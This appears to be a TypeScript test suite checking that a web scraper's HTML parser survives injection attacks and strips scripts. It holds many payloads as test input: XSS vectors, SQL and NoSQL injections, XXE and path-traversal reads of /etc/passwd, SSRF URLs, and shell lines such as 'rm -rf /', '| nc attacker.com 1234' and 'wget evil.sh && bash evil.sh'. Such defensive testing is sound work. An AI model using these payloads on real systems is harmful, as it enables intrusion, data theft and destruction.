import { describe, expect, it } from 'bun:test'
import { extractMainContent } from '../../src/extraction/content'
import { extractLinkPreview } from '../../src/meta'
import { extractText, parseHTML } from '../../src/web-scraper'

describe('Injection Attacks Edge Cases', () => {
  describe('XSS (Cross-Site Scripting) Payloads', () => {
    it('should safely handle basic script injection in content', () => {
      const html = `
        <article>
          <p><script>alert('XSS')</script></p>
          <p>Normal content</p>
        </article>
      `

      const result = extractMainContent(html)

      // Script should be removed from text content
      expect(result.textContent).not.toContain('<script>')
      expect(result.textContent).not.toContain('alert')
      expect(result.textContent).toContain('Normal content')
    })

    it('should handle script injection in attributes', () => {
      const html = `
        <div onclick="alert('XSS')" onload="malicious()">
          <img src="x" onerror="alert('XSS')" />
          <a href="javascript:alert('XSS')">Link</a>
        </div>
      `

      expect(() => parseHTML(html)).not.toThrow()
      const doc = parseHTML(html)
      expect(doc).toBeDefined()

      // Should parse but not execute
      const textContent = extractText(html)
      expect(textContent).toBe('Link')
    })

    it('should handle XSS in event handlers', () => {
      const html = `
        <button
          onclick="alert(1)"
          onmouseover="alert(2)"
          onfocus="alert(3)"
          onblur="alert(4)"
          onchange="alert(5)"
          onsubmit="alert(6)">
          Click me
        </button>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle XSS via img src', () => {
      const html = `
        <img src="javascript:alert('XSS')" />
        <img src="data:text/html,<script>alert('XSS')</script>" />
        <img src="x" onerror="alert('XSS')" />
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle XSS via svg elements', () => {
      const html = `
        <svg onload="alert('XSS')">
          <circle cx="50" cy="50" r="40" />
        </svg>
        <svg><script>alert('XSS')</script></svg>
      `

      expect(() => parseHTML(html)).not.toThrow()
      const result = extractMainContent(html)
      expect(result.textContent).not.toContain('<script>')
    })

    it('should handle XSS via style attributes', () => {
      const html = `
        <div style="background: url('javascript:alert(1)')">
          Content
        </div>
        <p style="expression(alert('XSS'))">Text</p>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle obfuscated XSS attempts', () => {
      const html = `
        <img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">
        <script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
        <img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
      `

      const result = extractMainContent(html)
      expect(result.textContent).not.toContain('alert')
    })

    it('should handle XSS via meta refresh', () => {
      const html = `
        <head>
          <meta http-equiv="refresh" content="0;url=javascript:alert('XSS')" />
        </head>
      `

      expect(() => extractLinkPreview(html)).not.toThrow()
    })

    it('should handle XSS in data attributes', () => {
      const html = `
        <div
          data-onclick="alert(1)"
          data-value="<script>alert('XSS')</script>"
          data-html="&lt;script&gt;alert('XSS')&lt;/script&gt;">
          Content
        </div>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle XSS via iframe srcdoc', () => {
      const html = `
        <iframe srcdoc="<script>alert('XSS')</script>"></iframe>
        <iframe srcdoc="&lt;script&gt;alert('XSS')&lt;/script&gt;"></iframe>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('SQL Injection Patterns', () => {
    it('should handle SQL injection in meta content', () => {
      const html = `
        <head>
          <meta name="description" content="'; DROP TABLE users; --" />
          <meta name="keywords" content="1' OR '1'='1" />
          <meta property="og:title" content="'; DELETE FROM products WHERE '1'='1" />
        </head>
      `

      expect(() => extractLinkPreview(html)).not.toThrow()
      const preview = extractLinkPreview(html)
      expect(preview.description).toBeDefined()
    })

    it('should handle SQL injection in text content', () => {
      const html = `
        <article>
          <h1>Article about '; DROP TABLE users; --</h1>
          <p>Content with 1' OR '1'='1</p>
          <p>More text: admin'-- </p>
        </article>
      `

      expect(() => extractMainContent(html)).not.toThrow()
      const result = extractMainContent(html)
      expect(result.textContent).toContain('DROP TABLE')
    })

    it('should handle SQL injection in URLs', () => {
      const html = `
        <a href="/page?id=1' OR '1'='1">Link 1</a>
        <a href="/page?id='; DROP TABLE products; --">Link 2</a>
        <a href="/search?q=admin'--">Link 3</a>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle SQL injection with UNION attacks', () => {
      const html = `
        <p>Search for: ' UNION SELECT password FROM users WHERE '1'='1</p>
        <p>ID: 1' UNION SELECT null, null, null--</p>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })
  })

  describe('Script Injection in Various Contexts', () => {
    it('should handle script injection in comments', () => {
      const html = `
        <!-- <script>alert('XSS')</script> -->
        <p>Content</p>
        <!-- --><script>alert('XSS')</script><!-- -->
      `

      expect(() => parseHTML(html)).not.toThrow()
      const result = extractMainContent(html)
      expect(result.textContent).not.toContain('<script>')
    })

    it('should handle script injection in JSON-LD', () => {
      const html = `
        <script type="application/ld+json">
        {
          "@type": "Article",
          "description": "</script><script>alert('XSS')</script><script>",
          "name": "Test"
        }
        </script>
      `

      expect(() => extractLinkPreview(html)).not.toThrow()
    })

    it('should handle script injection via protocol handlers', () => {
      const html = `
        <a href="vbscript:alert('XSS')">Link</a>
        <a href="data:text/html,<script>alert('XSS')</script>">Link</a>
        <a href="javascript:void(alert('XSS'))">Link</a>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle script injection in CSS', () => {
      const html = `
        <style>
          body { background: url('javascript:alert(1)'); }
          .class { content: '</style><script>alert("XSS")</script><style>'; }
        </style>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle script tags with unusual attributes', () => {
      const html = `
        <script src="evil.js"></script>
        <script type="text/vbscript">alert('XSS')</script>
        <script language="javascript">alert('XSS')</script>
        <script><!--
          alert('XSS')
        //--></script>
      `

      const result = extractMainContent(html)
      expect(result.textContent).not.toContain('alert')
    })
  })

  describe('HTML Comment Injection', () => {
    it('should handle malicious comments', () => {
      const html = `
        <!--[if IE]><script>alert('XSS')</script><![endif]-->
        <!-- --><script>alert('XSS')</script><!-- -->
        <!--><script>alert('XSS')</script><!---->
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle conditional comments with scripts', () => {
      const html = `
        <!--[if lt IE 7]>
          <script>alert('XSS')</script>
        <![endif]-->
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle nested and broken comments', () => {
      const html = `
        <!-- <!-- nested --> -->
        <!-- unclosed comment
        <script>alert('XSS')</script>
        <p>Content</p>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('CDATA Sections', () => {
    it('should handle CDATA with malicious content', () => {
      const html = `
        <![CDATA[
          <script>alert('XSS')</script>
        ]]>
        <p>Content</p>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle improperly closed CDATA', () => {
      const html = `
        <![CDATA[
          Malicious content
        <p>More content</p>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Entity Encoding Attacks', () => {
    it('should handle double-encoded attacks', () => {
      const html = `
        <div title="&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;">
          Content
        </div>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle mixed entity encoding', () => {
      const html = `
        <p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
        <p>&#60;script&#62;alert('XSS')&#60;/script&#62;</p>
        <p>&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;</p>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })

    it('should handle invalid entity references', () => {
      const html = `
        <p>&invalid;</p>
        <p>&#999999;</p>
        <p>&#xGGGG;</p>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Template Injection', () => {
    it('should handle template syntax in content', () => {
      // eslint-disable-next-line no-template-curly-in-string
      const templateLiteral = '${alert(\'XSS\')}'
      const html = `
        <div>{{ malicious_code }}</div>
        <div>{% exec 'rm -rf /' %}</div>
        <div><%= system('rm -rf /') %></div>
        <div>${templateLiteral}</div>
      `

      expect(() => parseHTML(html)).not.toThrow()
      const result = extractMainContent(html)
      expect(result.textContent).toBeDefined()
    })

    it('should handle Angular/Vue template syntax', () => {
      const html = `
        <div ng-bind-html="maliciousCode"></div>
        <div v-html="dangerousHtml"></div>
        <div [innerHTML]="userInput"></div>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Command Injection Patterns', () => {
    it('should handle shell command patterns in content', () => {
      const html = `
        <article>
          <p>Run: rm -rf /</p>
          <p>Execute: ; cat /etc/passwd</p>
          <p>Command: | nc attacker.com 1234</p>
          <p>Shell: && wget evil.sh && bash evil.sh</p>
        </article>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })

    it('should handle command injection in meta tags', () => {
      const html = `
        <meta name="description" content="; rm -rf /" />
        <meta property="og:description" content="| cat /etc/passwd" />
      `

      expect(() => extractLinkPreview(html)).not.toThrow()
    })
  })

  describe('LDAP Injection', () => {
    it('should handle LDAP injection patterns', () => {
      const html = `
        <p>Username: admin)(&amp;</p>
        <p>Filter: *)(uid=*</p>
        <p>Search: *(|(uid=*))</p>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })
  })

  describe('XML Injection', () => {
    it('should handle XML injection in content', () => {
      const html = `
        <article>
          <p>XML: <![CDATA[</p><script>alert('XSS')</script><p>]]></p>
          <p>Entity: &xxe;</p>
        </article>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })

    it('should handle XML external entity references', () => {
      const html = `
        <!DOCTYPE foo [
          <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <article>&xxe;</article>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('NoSQL Injection', () => {
    it('should handle NoSQL injection patterns', () => {
      const html = `
        <article>
          <p>Query: {"$gt": ""}</p>
          <p>Filter: {"$ne": null}</p>
          <p>Search: {"$where": "this.password"}</p>
        </article>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })
  })

  describe('Path Traversal', () => {
    it('should handle path traversal in URLs', () => {
      const html = `
        <a href="../../../etc/passwd">Link 1</a>
        <a href="....//....//....//etc/passwd">Link 2</a>
        <img src="../../images/../../../etc/passwd" />
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle encoded path traversal', () => {
      const html = `
        <a href="%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd">Link</a>
        <a href="..%252f..%252f..%252fetc%252fpasswd">Link</a>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('SSRF (Server-Side Request Forgery)', () => {
    it('should handle SSRF patterns in URLs', () => {
      const html = `
        <img src="http://169.254.169.254/latest/meta-data/" />
        <img src="http://localhost:8080/admin" />
        <img src="http://127.0.0.1:22" />
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle SSRF with internal IPs', () => {
      const html = `
        <a href="http://192.168.1.1/admin">Link 1</a>
        <a href="http://10.0.0.1/secret">Link 2</a>
        <a href="http://172.16.0.1/internal">Link 3</a>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Prototype Pollution', () => {
    it('should handle __proto__ in attributes', () => {
      const html = `
        <div data-__proto__="polluted">Content</div>
        <div data-constructor="malicious">Content</div>
        <div data-prototype="evil">Content</div>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle prototype pollution in JSON-LD', () => {
      const html = `
        <script type="application/ld+json">
        {
          "__proto__": {
            "isAdmin": true
          },
          "constructor": {
            "prototype": {
              "isAdmin": true
            }
          }
        }
        </script>
      `

      expect(() => extractLinkPreview(html)).not.toThrow()
    })
  })

  describe('Regular Expression DoS (ReDoS)', () => {
    it('should handle content that could cause ReDoS', () => {
      const html = `
        <article>
          <p>${'a'.repeat(10000)}b</p>
          <p>${'(a+)+'.repeat(100)}</p>
          <p>aaaaaaaaaaaaaaaaaaaaaaaaaaaa!</p>
        </article>
      `

      const start = performance.now()
      expect(() => extractMainContent(html)).not.toThrow()
      const duration = performance.now() - start

      // Should not take excessive time
      expect(duration).toBeLessThan(5000)
    })

    it('should handle pathological regex patterns in attributes', () => {
      const pattern = `${'a'.repeat(5000)}b`
      const html = `<div data-pattern="${pattern}">Content</div>`

      const start = performance.now()
      expect(() => parseHTML(html)).not.toThrow()
      const duration = performance.now() - start

      expect(duration).toBeLessThan(2000)
    })
  })

  describe('Polyglot Payloads', () => {
    it('should handle polyglot XSS payloads', () => {
      const html = `
        <div>
          jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e
        </div>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })

    it('should handle multi-context injection', () => {
      const html = `
        <script>
          var data = '</script><script>alert("XSS")</script><script>';
        </script>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Content Security Policy Bypass Attempts', () => {
    it('should handle CSP bypass attempts', () => {
      const html = `
        <base href="javascript:alert('XSS')//">
        <link rel="import" href="javascript:alert('XSS')">
        <meta http-equiv="refresh" content="0; javascript:alert('XSS')">
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Dangling Markup Injection', () => {
    it('should handle dangling markup', () => {
      const html = `
        <img src='
        <form action="http://attacker.com">
        <input name="csrf" value="token">
        '
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Null Byte Injection', () => {
    it('should handle null bytes in content', () => {
      const html = `
        <article>
          <p>Text\x00with\x00null\x00bytes</p>
          <a href="/page\x00.html">Link</a>
        </article>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })

    it('should handle null bytes in attributes', () => {
      const html = `<div data-value="test\x00value" id="id\x00test">Content</div>`

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Format String Attacks', () => {
    it('should handle format string patterns', () => {
      const html = `
        <article>
          <p>%s %d %x %n</p>
          <p>%08x.%08x.%08x.%08x</p>
          <p>%p %p %p %p</p>
        </article>
      `

      expect(() => extractMainContent(html)).not.toThrow()
    })
  })

  describe('Billion Laughs Attack', () => {
    it('should handle exponential entity expansion attempts', () => {
      const html = `
        <!DOCTYPE lolz [
          <!ENTITY lol "lol">
          <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
        ]>
        <article>&lol2;</article>
      `

      expect(() => parseHTML(html)).not.toThrow()
    })
  })

  describe('Defense Verification', () => {
    it('should ensure scripts are removed from text extraction', () => {
      const html = `
        <html>
        <head><script>evil()</script></head>
        <body>
          <script>more_evil()</script>
          <p>Safe content</p>
          <script src="external-evil.js"></script>
        </body>
        </html>
      `

      const text = extractText(html)

      expect(text).not.toContain('evil')
      expect(text).not.toContain('<script>')
      expect(text).toContain('Safe content')
    })

    it('should not execute any code during parsing', () => {
      let executed = false

      // This should never run
      const html = `
        <img src="x" onerror="${() => { executed = true }}" />
        <script>executed = true</script>
      `

      parseHTML(html)
      extractMainContent(html)

      expect(executed).toBe(false)
    })

    it('should handle all attack vectors without throwing', () => {
      const attacks = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(1)',
        '\'; DROP TABLE users; --',
        '../../etc/passwd',
        '%0a%0d',
        '${' + 'alert(1)}',
        '{{constructor.constructor("alert(1)")()}}',
      ]

      attacks.forEach((attack) => {
        const html = `<article><p>${attack}</p></article>`
        expect(() => parseHTML(html)).not.toThrow()
        expect(() => extractMainContent(html)).not.toThrow()
      })
    })
  })
})
